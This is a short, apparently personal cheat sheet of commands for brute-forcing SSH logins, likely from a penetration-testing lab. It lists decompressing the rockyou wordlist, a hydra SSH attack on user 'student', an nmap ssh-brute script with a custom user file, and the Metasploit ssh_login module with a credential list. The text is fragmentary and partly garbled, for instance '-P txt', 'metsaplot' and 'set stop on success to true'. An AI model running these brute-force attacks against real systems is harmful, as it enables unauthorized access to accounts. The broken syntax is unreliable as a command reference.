gzip -d rockyou.txt 

hydra -l student -P txt IP ssh 

ssh student @IP

echo "administrator" > users

--script ssh-brute --script-args userdb=/root/users

msfconsole
ssh/ssh_login 
/usr/share/wordlist/metsaplot/root_userpass.txt
set stop on success to true

